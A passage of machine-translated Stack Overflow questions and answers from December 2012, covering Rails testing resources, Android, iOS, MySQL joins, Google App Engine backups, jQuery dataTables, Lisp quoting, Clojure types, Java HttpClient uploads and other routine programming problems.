> 时间：2012-12-26T10:50:42.900

1.  [Rspec 书](http://pragprog.com/book/achbd/the-rspec-book)
2.  [Codeschool 的 Rspec 测试](http://www.codeschool.com/courses/testing-with-rspec)
3.  [Peepcode 的 RSpec 演员表](https://peepcode.com/screencasts/rspec)

当然还有不朽的 railscasts.com

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-12-26T10:49:02.863

试着看一些演员表。我推荐我[如何测试](http://railscasts.com/episodes/275-how-i-test)Ryan Bates 的演员表

更多：[railscasts](http://railscasts.com/episodes?utf8=%E2%9C%93&search=rspec)

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-12-26T11:11:35.530

当我做 Michael Hartl 的教程时，我对它有很好的感觉：

[http://ruby.railstutorial.org/](http://ruby.railstutorial.org/)

# ruby-on-rails - Refinery CMS 替换模型层

> ID：14039484
> 
> 赞同：0
> 
> 时间：2012-12-26T10:45:10.717
> 
> 标签：ruby-on-rails, content-management-system, refinerycms

我有一种情况，我想用 API 调用替换由**Refinery CMS引擎生成的****模型层**（Activerecord），这些 API 调用将以 JSON 格式返回数据给我。可能吗？如果是，请指导我进行一些教程/演示。

# android - 使用片段的选项卡项目不起作用

> ID：14039485
> 
> 赞同：0
> 
> 时间：2012-12-26T10:45:21.310
> 
> 标签：android, tabs, android-fragments

我正在尝试使用片段制作标签。在单击每个选项卡时，显示的内容是“带有标签的选项卡的内容：（标签）”。这是我的项目：

`http://www.filedropper.com/androiduxframework_1`

我参考了许多与带有片段的选项卡相关的链接（包括

`http://android.codeandmagic.org/2011/07/android-tabs-with-fragments/`

和

`http://neilgoodman.net/2012/03/12/working-with-fragments-on-android-part-2/`

) 在制作这个项目之前。但是它没有给出预期的输出。AVD 上不显示任何选项卡，只打印一个单词（“人物”：第一个选项卡的指示器/标签）。请帮我。提前致谢！:)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-26T11:00:19.627

使用 Jake Wharton 的 Android Sherlock Tab。它会提供更多想法。它将全面支持

版本。导入那个 sherlock 库并使用示例，希望你能得到它。

[https://github.com/JakeWharton/ActionBarSherlock](https://github.com/JakeWharton/ActionBarSherlock)

# objective-c - 从另一个 ViewController 设置 UIScrollView 的位置

> ID：14039488
> 
> 赞同：2
> 
> 时间：2012-12-26T10:45:36.373
> 
> 标签：objective-c, ios, uiviewcontroller, uiscrollview, contentoffset

我正在尝试通过使用 contentOffset 来设置 UIScrollView 的位置：

```
- (void) navigateToTableViewPosition:(CGPoint)contentOffset {
    NSLog(@"Position set method gets called...");
    NSLog(@"%@", NSStringFromCGPoint(contentOffset));
    [mainScrollView setContentOffset:contentOffset animated:YES];
} 
```

在我关闭它之前，我从另一个视图控制器调用这个方法，一切都检查出来了。我正确传递了参数，并调用了该方法（使用 NSLog 检查），但滚动视图没有移动......

有趣的是，当我从它所在的视图控制器调用此方法时，它工作正常。只有当我从另一个视图控制器调用它时，它才会停止工作。

仅供参考，这里是调用方法：

```
MainViewController *mainView = [[MainViewController alloc] init];
[mainView navigateToTableViewPosition:contentOffset]; 
```

内容偏移量是我预先设置的 CGPoint。在这里没关系；此外，无论如何它都会正确传递。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-26T10:57:05.230

试试这个，当你想改变时，你必须`send notification`从其他人那里改变..`viewcontroller`

```
 [[NSNotificationCenter defaultCenter] postNotificationName:@"changepostion"        object:NSStringFromCGPoint(CGPointMake(contentOffset.x, contentOffset.y))]; 
```

在`mainviewcontroller`

```
 -(void)viewDidLoad

  {
     [[NSNotificationCenter defaultCenter] removeObserver:self];
         [[NSNotificationCenter defaultCenter] addObserver:self    selector:@selector(navigateToTableViewPosition:) name:@"changepostion" object:nil];

  }

- (void) navigateToTableViewPosition:(NSNotification *)notification
  {
        contentOffset =CGPointFromString([notification object]);

   NSLog(@"Position set method gets called...");
   NSLog(@"%@", NSStringFromCGPoint(contentOffset));
    [mainScrollView setContentOffset:contentOffset animated:YES];
 } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-26T10:50:55.373

您不能设置不可见视图的属性。如果您使用的是 iOS5+，您可以在视图关闭完成块的完成中实现偏移设置。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-26T10:57:36.967

在视图控制器中使用**委托**进行反向消息传递。

有关更多参考，请参阅[Basic Delegate Example](http://coderchrismills.wordpress.com/2011/05/05/basic-delegate-example/)链接。

您正在制作 viewcontroller 的新实例，该实例将调用方法但没有任何效果。

# mysql - 获取值的查询

> ID：14039494
> 
> 赞同：0
> 
> 时间：2012-12-26T10:46:02.317
> 
> 标签：mysql, sql, select

我有两个表格问题和标签，每个问题都与我想使用查询获取问题和相关标签的许多标签相关联。我不知道如何获取它。

```
questions 
qid ques
Q1  abc
Q2  rst 

tags
id  tag   qid
T1   css   1
T2   html  1
T3   java  1
T4   php   2
T5   c++   2
T6   html  2 
```

我想要结果为

```
Q1 abc   T1   css   1
         T2   html  1
         T3   java  1 
```

q1 abc 不应与标签重复

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-26T10:48:08.337

如果您的问题至少有一个标签使用`INNER JOIN`。

```
SELECT  a.*, b.*
FROM    Question a
        INNER JOIN tags b
            ON a.qid = b.qid
-- WHERE a.qid = 1
ORDER BY a.qid, b.id 
```

但是如果标签是可选的并且您仍然希望问题显示在结果列表中，请使用`LEFT JOIN`

```
SELECT  a.*, b.*
FROM    Question a
        LEFT JOIN tags b
            ON a.qid = b.qid
-- WHERE a.qid = 1
ORDER BY a.qid, b.id 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-26T10:54:43.427

用这个：

```
SELECT q.qid,q.ques,t.id, t.tag,t.qid FROM questions AS q JOIN tags AS t WHERE q.qid = t.qid 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-26T10:50:00.413

```
 SELECT ques,tag FROM quesions t1,tags t2 ON t1.qid = t2.qid 
```

# google-app-engine - 无法将 GAE 应用程序数据存储备份到 GS 存储桶

> ID：14039500
> 
> 赞同：13
> 
> 时间：2012-12-26T10:46:21.497
> 
> 标签：google-app-engine, google-cloud-storage, google-cloud-datastore, database-backups

我正在尝试将 GAE 数据存储备份到 GS 存储桶，如下所述：[https](https://developers.google.com/appengine/docs/adminconsole/datastoreadmin#Backup_And_Restore) ://developers.google.com/appengine/docs/adminconsole/datastoreadmin#Backup_And_Restore 。我试图以表格形式提供存储桶名称：

```
bucket 
/gs/bucket
/gs/bucket/path 
```

但它不起作用。每次收到消息：

```
There was a problem kicking some off the jobs/tasks:
Invalid bucket name: 'bucket' 
```

我究竟做错了什么？是否可以在不为此编写自定义代码的情况下将所有数据（包括 blob 文件）备份到 GS？

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2014-07-19T06:42:19.133

我通过将服务帐户电子邮件添加为具有写入权限的特权用户来使其工作。

这是我所做的：

1.  通过 Web 界面创建存储桶（STORAGE>CLOUD STORAGE>Storage Browser > New Bucket）
2.  将 APPID@appspot.gserviceaccount.com 添加为具有编辑权限的特权用户（权限>添加成员）

即使认为它是同一个项目的一部分，出于某种原因，我仍然必须将项目电子邮件添加为特权用户。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2013-01-09T09:39:17.850

我怀疑存储桶不存在，或者应用引擎没有写入存储桶的权限。

确保以下情况属实：

1.  您已经创建了`BUCKET`. 如有必要， 使用[gsutil](https://developers.google.com/storage/docs/gsutil#gettingstarted)之类的东西来创建存储桶。
    *   `gsutil mb gs://BUCKET`
2.  确保您的应用引擎服务帐户对`BUCKET`.
    *   [服务帐户](https://stackoverflow.com/questions/8779925/where-do-the-app-engine-service-account-gserviceaccount-emails-go)的格式为`APP_NAME`@appspot.gserviceaccount.com。
    *   将服务帐户添加到具有访问权限的[项目团队](https://code.google.com/apis/console/?#:team)`can edit`。
    *   或者，您可以[在那里更改存储桶 acl](https://developers.google.com/storage/docs/accesscontrol#About-Access-Control-Lists)和服务帐户。这个选项比较复杂。
3.  现在使用表格开始备份`/gs/BUCKET`

如果您收到一条`Bucket "/gs/BUCKET" is not accessible`消息，则您的存储桶不存在，或者`APP_NAME@appspot.gserviceaccount.com`无权访问您的存储桶。

注意：表格是`/gs/BUCKET`. 以下是错误的：*BUCKET*，*gs://BUCKET*，*gs/BUCKET*等。

使用以下命令检查存储桶是否存在并具有正确的权限：

```
gsutil getacl gs://BUCKET  # Note the URI form here instead of a path. 
```

查找类似以下的条目：

```
<Entry>
  <Scope type="UserByEmail">
    <EmailAddress>APP_NAME@appspot.gserviceaccount.com</EmailAddress>
  </Scope>
  <Permission>WRITE</Permission>
</Entry> 
```

如果您没有看到一个，您可以通过以下方式添加一个：

```
gsutil getacl gs://BUCKET > acl.xml
vim acl.xml  # Or your favorite editor
# Add the xml above
gsutil setacl acl.xml gs://BUCKET 
```

现在上述步骤将起作用。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-31T00:34:16.377

我自己花了一段时间来解决这个问题。感谢@fejta 的帮助。

我想不通。我已将我的用户添加到项目中，验证我可以编写，手动更新 ACL（这不应该是必需的），...

最后，通过以下方式从命令行创建一个存储桶：

```
gsutil mb gs://BUCKET 
```

而不是 Web 用户界面对我有用。在将用户添加到团队之前或之后创建的多个存储桶都导致“无效存储桶名称”

我解决了这个问题：

```
/gs/BUCKET 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-05-18T08:00:04.497

请务必严格遵循此处的说明：

[https://cloud.google.com/appengine/docs/standard/python/console/datastore-backing-up-restoring#restoreing_data_to_another_app](https://cloud.google.com/appengine/docs/standard/python/console/datastore-backing-up-restoring#restoring_data_to_another_app)

要确保的事项：

1.  将 ACL 权限添加到您的目标应用程序
2.  如果在给bucket添加权限之前已经创建了备份，找到备份并添加权限
3.  添加*[PROJECT_ID]@appspot.gserviceaccount.com*作为具有编辑角色的源应用程序的成员
4.  在源应用程序中导入的路径是*/gs/bucket*

# jquery - 带有选择标签的 dataTables 列过滤插件

> ID：14039501
> 
> 赞同：3
> 
> 时间：2012-12-26T10:46:23.690
> 
> 标签：jquery, datatables

我正在使用数据表 v1.92 以及列过滤插件 v1.5.0。

### 问题

我需要为单个列过滤创建下拉列表，其标记将是

```
<option value="1">Abc</option>
<option value="2">Def</option>
<option value="3">Ghi</option> 
```

这是因为来自数据库的值是`1, 2, or 3`. 显示给用户的标签是`Abc, Def, or Ghi`

使用列过滤插件，我可以使用为列创建下拉列表

```
.columnFilter({
    aoColumns: [ type : 'select', values:['1', '2', '3']
               ]
         }); 
```

问题是该下拉列表的标记结果是

```
<option value="1">1</option>
<option value="2">2</option>
<option value="3">3</option> 
```

所以用户显示`1, 2, 3`为下拉标签而不是`Abc, Def, Ghi`

### 我尝试了什么

我试图硬编码数据表`<tfoot>`部分中的下拉列表，但随后

```
.columnFilter({
    aoColumns: [ type : 'select', values:['1', '2', '3']
                   ]
             }); 
```

覆盖硬编码的下拉菜单。我什至尝试将`null`其作为参数传递，`aoColumns`但这也不起作用，因为它只是删除了硬编码的下拉列表。

那么有没有一种方法可以创建下拉列表，其中`value`属性将保存一个数值，而标签之间的标签`<option>`将`</option>`是文本？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-24T12:21:56.450

我不确定您是否已经解决了这个问题，但是查看 dataTables 插件站点，我看不出有什么方法可以解决您的问题。

但是对于一种解决方法，您可以事先创建`<select>`菜单，然后使用`fnFilter`回调使用特定值更新您的列。

例如

```
<select>
   <option value="1">ABC</option>
   <option value="2">DEF</option>
   <option value="3">GHI</option>
</select> 
```

-

```
$('select').change(function(){
    yourTable.fnFilter($(this).val(),colNum);
    // With colNum being the targeted column.  
}); 
```

然后，上面将按`<option>`标签的值过滤表格，例如`1`. 但是，如果您正在查看`<option>`标签中包含的 ABC 过滤。

```
$('select').change(function(){
   yourTable.fnFilter($('select option:selected').text(),colNum); 
}); 
```

希望这会有所帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-09-04T09:38:42.757

如果您正在使用`jquery.dataTables.columnFilter.js`，那么以下方法将适用于您：

而不是写：

```
type : 'select', values:['1', '2', '3'] 
```

写这个：

```
"type": "select", values: [{ label: "ABC", value: "1" }, { label: "DEF", value: "2" }] 
```

# lisp - 在 lisp 中多次引用的要点？（例如'''''a）

> ID：14039502
> 
> 赞同：0
> 
> 时间：2012-12-26T10:46:26.240
> 
> 标签：lisp, evaluation, quote

能够`quote`多次使用有没有用？

Like `'a`is different from `''a`and `(quote a)`is different from`(quote (quote a))`

我的意思是，为什么不拥有它，这样它就`''a`等于`'a`或什至`''''''''a`. `quote`如果它给出的论点尚未被引用，则将引用，并且这种方式 `''''a`将评估为`'a`.

我觉得它的方式不对，因为我认为问题应该是：它被引用了吗？而不是被引用了多少次？没有任何？一次？100次？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-30T19:52:41.003

嵌套引号在很大程度上是无用的。它可能发生在反引号语法的编译器的输出中，但我想不出你会这样做的任何理由，即使在嵌套宏中也是如此。如果您发现自己使用了级联引号，这可能意味着您在反引号模板中插入了错误的取消引用级别的表达式。

具体来说，假设你写了这样的东西：

```
````(,,,,'''''a)  ;; goal is to be left with ('a) at the end of four eval rounds 
```

但是在这里，逗号和引号基本上取消了，你可以这样做：

```
````('a) 
```

无需将表单分配给`''''a`最里面的反引号，并让它`'a`在多个评估中反向工作。只需分配`'a`到最外层即可。

另一个例子是对上述内容的轻微修改。我们预计会发生四轮评估，并在最后一轮`a`替换它在评估环境中的绑定：

```
````(,,,,''''a)  ;; only four quotes this time 
```

所以现在，在上述反引号的结果的三个`eval`s 之后，我们留下了`(a)`，如果我们`eval`这样，它想调用 function `a`。但是，同样，我们可以实现同样的事情：

```
````(a) 
```

和之前一模一样，三个`evals`产生`(a)`一个又一个想要跟注`a`。

现在如果符号`a`不是字面上的`a`，而是计算出来的呢？说`a`是被替换为`b`：

```
 (let ((a 'b))
   ````(,,,''',a)) 
```

替换必须发生在反引号的第一次求值中，在 , 里面`let`，所以`b`左边需要四个逗号，以便它连接到最外面的反引号。结果对象等价于

```
 ```(,,,'''a) 
```

在这个例子中，我们不能只取消三个逗号和引号。但是，习惯的方式是让两者穿插：

```
 (let ((a 'b))
   ````(,',',',a)) ;; instead of ,,,''',a 
```

每一轮评估都会去掉一个报价，然后再加一个。第一个替换用 替换`,a`，`b`然后用引号保护它。然后在下一轮中，该引号之前的逗号会`,'b`被替换为`b`，但之前的另一个引号会再次保护它，依此类推。

也就是说，您可能会看到直接复合引号做一些有用的两种情况是：三重（或更多）嵌套反引号（很少开始！）其中有人使用`,,'',expr`而不是`,',',expr`; 以及多余地使用多个引号来对抗某种形式的多次评估，这些评估不必要地被淹没在多个评估轮次中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-26T13:11:47.980

当然有。当表达式被多次评估时，您需要将表达式按原样通过多次评估。请记住，在编写宏时，表达式通常会被计算两次（一次在扩展期间，一次作为宏结果），在极少数情况下可能需要计算更多次。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-05-01T02:14:14.017

@Kaz 对于通常的做法毫无疑问是正确的，但我同意 @JanHudec 关于什么适合 CL。 `'a`与 的意思相同`(quote a)`，与`''a`的意思相同`(quote (quote a))`。你的建议，user1076329，是评估`(quote (quote a))`应该具有与评估相同的结果`(quote a)`。让函数难以返回，感觉有悖于CL的精神`'a`. （例如，假设您正在编写一个程序，该程序将生成 Lisp 源代码以写入文件并稍后进行评估？或者编写一个为编写 Lisp 程序的程序生成 Lisp 源代码的程序？Lisp 旨在使做这种事情很容易。）在许多情况下，您可以并且应该使用宏，但本质上，宏只是构造列表然后评估它们的方式。您应该能够在没有宏或反引号的情况下构建相同的列表，即使它们更容易。

# android - 使用点向中心画线

> ID：14039503
> 
> 赞同：0
> 
> 时间：2012-12-26T10:46:27.323
> 
> 标签：android, math, geometry

我有一些点可以形成一个圆圈。我想要每个点的另一个点，这样如果我们使用这两个点画一条线，这条线应该指向圆的中心。我有每个点相对于圆心的角度。为了清楚起见，我添加了一个快照。![在此处输入图像描述](../Images/1616d4999d39d98db77743ef0001b3ef.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-26T11:03:47.347

让 DIST 成为你想要的圆心和你绘制的点之间的距离。然后，如果 ANGLE 是中心和外部点之间的角度（以弧度为单位）。

x= DIST * Math.cos(ANGLE), y= DIST * Math.sin(ANGLE)

# c# - 如果列和行是动态的，如何写入列表？

> ID：14039506
> 
> 赞同：0
> 
> 时间：2012-12-26T10:46:42.347
> 
> 标签：c#, sql-server

我从 ms sql 数据库中动态读取了一些数据。我将部门列表（行作为列标题）作为列读取，并将其相应的名称作为行读取。我使用下面的代码将其绑定到类文件列表

```
 String @querystring="....";
    IEnumerable<EmpDepartment> empdepartment = DB.ExecuteQuery<EmpDepartment>(@querystring).ToList();

        foreach (EmpDepartment empvar in empdepartment)
        {
            string Designame = empvar.Designation[0].DesignationName.ToString(); ---> Here it gives null             
        } 
```

// 我的班级看起来像这样，

```
public class Designationlist
{       
    public int DesignationId{ get; set; }
    public int DesignationName{ get; set; }
}

public class EmpDepartment
{
    public string DepartmentName{ get; set; }
    public IList<Designationlist> Designation{ get; set; }
} 
```

如果列及其对应的行是动态的，如何写入列表。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-26T11:49:05.143

```
It should be of Designation,since designation of type Designationlist under EmpDepartment

foreach (EmpDepartment empvar in empdepartment)
{
    string Designame = empvar.Designation[0].DesignationName.ToString(); 
} 
```

# java - apache HttpClient，通过表单上传文件：使用 StringBody 而不是 FileBody

> ID：14039510
> 
> 赞同：1
> 
> 时间：2012-12-26T10:46:50.287
> 
> 标签：java, http, httpclient

Web 服务器希望通过 html 表单上传文件。

这就是我构建 MultipartEntity 的方式，它已经有效：

```
FileBody filePart = new FileBody(new File("emptyFile.txt"), "text/plain");
FormBodyPart fbp = new FormBodyPart("UploadService", filePart);
MultipartEntity mpe = new MultipartEntity();  
mpe.addPart(fbp); 
```

事实是我的数据在内存中，所以我不喜欢将它保存到磁盘的想法，所以我试图替换

```
FileBody filePart = new FileBody(new File("emptyFile.txt"), "text/plain"); 
```

和

```
StringBody filePart = new StringBody(""); 
```

但是第二种方式不行，服务器返回HTTP 500异常；记录在线上的数据，我注意到唯一的区别如下：

使用 FileBody 时的 HTTP POST 跟踪：

```
...
Content-Disposition: form-data; name="UploadService"; filename="emptyFile.txt"
... 
```

使用 StringBody 时的 HTTP POST 跟踪：

```
...
Content-Disposition: form-data; name="UploadService"
... 
```

即，在 FileBody 上传中，指定了 StringBody 上传中未指定的“文件名”。我怎样才能解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T11:26:58.873

使用 a`StringBody`您将无法[设置文件名](http://hc.apache.org/httpcomponents-client-ga/httpmime/xref/org/apache/http/entity/mime/content/StringBody.html#160)。但是您可以扩展`StringBody`和覆盖`getFilename()`以不返回`null`。

根据 的来源[`FormBodyPart`](http://hc.apache.org/httpcomponents-client-ga/httpmime/xref/org/apache/http/entity/mime/FormBodyPart.html#87)，这应该足以具有所需的 filename-parm 参数：

```
 protected void generateContentDisp(final ContentBody body) {
     StringBuilder buffer = new StringBuilder();
     buffer.append("form-data; name=\"");
     buffer.append(getName());
     buffer.append("\"");
     if (body.getFilename() != null) {
         buffer.append("; filename=\"");
         buffer.append(body.getFilename());
         buffer.append("\"");
     }
     addField(MIME.CONTENT_DISPOSITION, buffer.toString());
 } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-12-21T19:33:37.253

只是把它放在这里，因为我遇到了问题并在我的搜索中不断来到这里......类似于上面的方法，但我想它更简单。

```
public class StringFileBody extends FileBody {

    private String data;

    public StringFileBody( String input, ContentType contentType ) {

        super( new File( "." ), contentType );

        data = input;
    }

    public StringFileBody( String input, ContentType contentType, String fileName ) {

        super( new File( "." ), contentType, fileName );

        data = input;
    }

    @Override
    public void writeTo( OutputStream out ) throws IOException {

        out.write( data.getBytes( ) );
    }

    @Override
    public long getContentLength( ) {

        return data.getBytes( ).length;
    }
} 
```

# clojure - Clojure（或任何其他 Lisp）中 + 函数的类型是什么？

> ID：14039512
> 
> 赞同：4
> 
> 时间：2012-12-26T10:46:57.807
> 
> 标签：clojure, lisp

我知道 Lisps（通常）是动态类型的，但我猜它们的值仍然有类型。函数是 lisps 中的值，所以我想知道函数的类型是`+`什么？

`List of numbers -> number`似乎最有可能，所以我在 Clojure 中尝试过`(+ '(2 3))`，`(+ [2 3])`但都没有奏效。

是否可以在 Clojure REPL 中查询值（或表达式）的类型？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-26T11:03:41.010

它实际上是一种相当复杂的类型，由于多种原因很难正式定义：

*   它是一个**多参数函数**（接受可变数量的参数）。请注意，这与采用单个参数的函数*不同，该参数是数字列表。*如果您想在`+`需要使用的数字列表中使用，`apply`例如`(apply + [1 2 3 4])`
*   每个参数可以是`Number`任何类型的。有许多可能的数字类型，实际上任何扩展[`java.lang.Number`](http://docs.oracle.com/javase/1.5.0/docs/api/java/lang/Number.html)基类的东西就足够了。
*   **定义的内联版本**可以直接生成原始类型。

没有一种简单的方法可以从 REPL 中确定这一点。但是您可能对[Typed Clojure](https://github.com/frenchy64/typed-clojure)感兴趣，它提供了一个类型系统以及定义类型和在 Clojure 中进行相应类型检查的方法。它使用一种称为“渐进式键入”的简洁方法，因此您可以在需要的地方添加类型注释：您不需要一次将类型分配给整个程序。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-26T10:52:03.027

Clojure 有这个[`type`](http://clojuredocs.org/clojure_core/clojure.core/type)功能。

```
> (type +)
clojure.core$_PLUS_

> (type clojure.core$_PLUS_)
java.lang.Class

> (type (+ 1 1))
java.lang.Long

> (type (+ 1.0 1.0))
java.lang.Double 
```

因此，该函数根据参数`+`返回 a`Long`或 a 。`Double`

其他算术函数也根据参数返回不同的类型：

```
> (type (/ 3 1))
java.lang.Long

> (type (/ 3.0 1))
java.lang.Double

> (type (/ 1 3))
clojure.lang.Ratio 
```

如果你想看看这个功能是如何实现的，就像[访问源代码](https://github.com/clojure/clojure/blob/master/src/clj/clojure/core.clj#L936)一样简单。这使您可以了解如何定义多参数函数。

# javascript - setTimout 到一个函数

> ID：14039513
> 
> 赞同：-1
> 
> 时间：2012-12-26T10:47:09.820
> 
> 标签：javascript, google-maps-api-3, settimeout

我想你可以帮我设置这个函数的超时时间。我设置的超时似乎会破坏循环。

```
window.eqfeed_callback = function(results) {
    for (var i = 0; i < results.features.length; i++) {
        var earthquake = results.features[i];
        var coords = earthquake.geometry.coordinates;
        var latLng = new google.maps.LatLng(coords[1],coords[0]);
        var marker = new google.maps.Marker({
            position: latLng,
            map: map,
            icon: getCircle(earthquake.properties.mag) 
        });
        map.panTo(latLng);
    }
} 
```

已解决：通过定义一个函数来进行变量

```
window.eqfeed_callback = function(results) {
    for (var i = 0; i < results.features.length; i++) {
       var earthquake = results.features[i];
       var coords = earthquake.geometry.coordinates;
       var latLng = new google.maps.LatLng(coords[1],coords[0]);
       (function(i, earthquake, coords, latLng) {
         setTimeout(function() {
         var marker = new google.maps.Marker({
           position: latLng,
           map: map,
           icon: getCircle(earthquake.properties.mag),
           animation: google.maps.Animation.DROP });
         map.panTo(latLng);
         }, i * 400);
       }(i, earthquake, coords, latLng));

    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-26T10:51:36.733

以下内容对您有用吗？当然，您必须在结果变量中传递有效数据才能使回调执行正常工作。

```
setTimeout(function() {
    window.eqfeed_callback(results)
}, 4000); 
```

# groovy - 默认情况下，Soap UI 在 new File() Groovy 脚本中在哪里查找文件？我该如何改变这个？

> ID：14039514
> 
> 赞同：5
> 
> 时间：2012-12-26T10:47:21.313
> 
> 标签：groovy, soapui

我有一个 groovy 脚本，它从文件中读取文本并将其作为响应返回

我必须阅读如下

```
text = new File("D:/text.xml") 
```

现在问题是我想使用相对路径..所以我想知道

如果我只是说

```
text = new File("text.xml") 
```

Soap UI / Groovy 默认从哪里开始搜索文件？这当前会引发“java.io.FileNotFoundException”。

*如何更改它以使其使用相对于 project.xml 文件的路径？*

**这就是我最终解决我的要求的方式**

```
def groovyUtils = new com.eviware.soapui.support.GroovyUtils(context)
def projectPath = groovyUtils.projectPath //gets the path of the project root
def response = new File(projectPath, "/test.xml").text; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-27T08:06:26.273

您可以`Resource Root`在soapUI 中设置项目属性。

`${projectDir}`指向您的项目文件夹。

![资源根项目属性](../Images/2930b0f8c4b01a0e9d7da5a41aaafcda.png)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-26T10:54:57.027

添加

```
System.out.println(System.getProperty("user.dir")); 
```

或者

```
System.out.println(text.getAbsolutePath()); 
```

到你的脚本找出来。

# objective-c - 在 iOS 6 上使用 MPMoviePlayerViewController 显示视频文件

> ID：14039537
> 
> 赞同：1
> 
> 时间：2012-12-26T10:49:58.933
> 
> 标签：objective-c, ios6, mpmovieplayercontroller, mpmoviewcontroller

我正在尝试在服务器上打开视频文件。

使用以下代码在 < 6.0 上运行良好：

```
 NSURL *videoURL = [NSURL URLWithString:[[[[self.campArray objectAtIndex:button.tag]valueForKey:@"images"]objectAtIndex:0]valueForKey:@"imageURL"]];
self.moviePlayer = [[MPMoviePlayerViewController alloc] initWithContentURL:videoURL];
self.moviePlayer.moviePlayer.shouldAutoplay=YES;
[self presentModalViewController:self.moviePlayer animated:YES];
[self.moviePlayer.moviePlayer play];
[self.moviePlayer release]; 
```

但是当尝试在具有 iOS 6 的设备上运行此代码时，会显示模态视图，然后在 1 秒后关闭。它不会崩溃...播放器模式视图刚刚关闭...我阅读了有关此内容并添加了`@property (strong,nonatomic) MPMoviePlayerViewController *moviePlayer;`但它仍然无法正常工作...

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-26T13:26:39.743

您应该使用 iOS 6.0 中的 presentViewController 方法来呈现视图控制器。presentModalViewController 在 ios 6.0 中已弃用。

# android - 用于 android 的基于图像的个人菜单

> ID：14039538
> 
> 赞同：0
> 
> 时间：2012-12-26T10:49:58.867
> 
> 标签：android, image, menu

我对android很陌生，并且有一个关于个人菜单的问题。

我想让几个活动使用一个菜单。所以我创建了一个`header.xml`文件，我将其包含在所有活动中。标题中有 4 张图片，我想让它们可点击（这与`android:onClick`功能无关），并且我想向用户显示正在运行的活动。

所以我想用“活动 1 活动”图像替换“活动 1”图像，依此类推。单击“活动 3”时，菜单应使用以下图像，例如：

活动 1，活动 2，活动 3 活动，活动 4

此外，活动图像不应该是可点击的，因为这会刷新页面。

我会很高兴知道如何解决它！（项目应该运行`android:minSdkVersion="8"`）

打招呼

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-26T11:43:23.563

为了向用户显示他在哪个活动中，您可以在 OnCreate中显示长或短的**Toast消息，例如**

```
Toast.makeText(getApplicationContext(), "Welcome in activity 3",
        Toast.LENGTH_LONG).show(); 
```

对于停止点击功能，您可以使用以下方法取消按钮的 OnClick()：

```
image3.setClickable(false); 
```

# cordova - 在Phonegap后台发送短信的问题

> ID：14039540
> 
> 赞同：0
> 
> 时间：2012-12-26T10:50:06.497
> 
> 标签：cordova

谁能帮我使用Phonegap在后台发送短信，

我已经在 Git-hub 中尝试过该示例，但我收到了错误消息

```
Uncaught TypeError: Cannot read property 'sms' of undefined at file:///android_asset/www/sendingsms.html: 
```

任何人都可以在这个问题上帮助我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T16:52:17.547

您应该使用使用本机 SMS 管理器的插件。

我刚刚写了这样的插件（使用Phonegap 2.5）：[https ://github.com/Pyo25/phonegap-sms-sending-plugin](https://github.com/Pyo25/phonegap-sms-sending-plugin)

包含所需文件后，您只需调用 send 方法。例子：

```
var smsSendingPlugin = cordova.require('cordova/plugin/smssendingplugin');
smsSendingPlugin.send ("0032472345678", "Hello World !", function() {
    // message sent
}, function() {
    // message not sent
}); 
```

# jquery - 在 Zebra 日期选择器中动态设置从后端检索的特定日期

> ID：14039545
> 
> 赞同：1
> 
> 时间：2012-12-26T10:50:48.953
> 
> 标签：jquery

我在我的应用程序中使用 Zebra Date Picker，它很好用。

但是现在我尝试在单击按钮时动态设置日期。我在网上搜索任何参考资料，但找不到任何参考资料。

请提出任何可能的解决方案。

参考：[http ://stefangabos.ro/jquery/zebra-datepicker/](http://stefangabos.ro/jquery/zebra-datepicker/)

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-12-26T11:24:58.903

据我所知，它可以像下面这样完成：

```
$("#datepicker-example13").val('2012-12-23').data('Zebra_DatePicker').show(); 
```

当我在控制台中运行它时，这在他们的页面上运行良好

# paperjs - 同一个paperscope中的多个脚本/paperscript

> ID：14039554
> 
> 赞同：2
> 
> 时间：2012-12-26T10:51:47.003
> 
> 标签：paperjs

我从 paper.js 开始。我喜欢这样一个事实，即它引入了具有文本/纸质脚本 mime 类型的脚本的可能性，该脚本在其范围内运行。但是，脚本很快就会变大，因此我希望能够将其分成多个脚本以提高可读性。我以为我可以添加多个脚本标签并让它们都在同一范围内运行，但显然情况并非如此。

两个脚本都已加载并运行，但第二个脚本似乎不在论文范围内。

我在这里设置了一个例子：http: [//barbata.nl/SO/Maps/](http://barbata.nl/SO/Maps/)这个例子有一些代码，但我会指出重要的部分。

它包含两个paperscript：

*   Maps.js 是主脚本，它对图像进行光栅化并允许移动它。您可以忽略此脚本中的代码，因为到目前为止它运行良好。

